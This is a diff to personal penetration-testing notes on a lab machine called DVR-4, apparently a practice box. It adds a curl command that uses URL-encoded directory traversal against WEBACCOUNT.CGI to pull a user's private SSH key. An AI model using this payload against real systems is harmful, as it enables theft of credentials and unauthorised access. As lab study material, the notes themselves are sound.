@@ -3,7 +3,7 @@ Alias: DVR-4
 Date: 8/21/2022
 Platform: Windows
 Difficulty: Intermediate
-Tags: #WindowsDirectoryTraversalExploit
+Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey
 Status: Finished
 IP: 192.168.122.179
 ---
@@ -217,6 +217,19 @@ Enumerated top 200 UDP ports:
 #### - Googled "url encoded characters" and found the following webpage showing character "." will be used as %2E and character "/" used as %2F:
 
 ![](Pasted%20image%2020221009191130.png)
+
+![](Pasted%20image%2020221009191245.png)
+
+![](Pasted%20image%2020221009191343.png)
+
+
+#### - Typed the following on kali machine to retreive private ssh key for the found user "viewer" found previously "curl "http://[Kali IP]:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"
+
+![](Pasted%20image%2020221009191611.png)
+
+
+
+
 
 
 
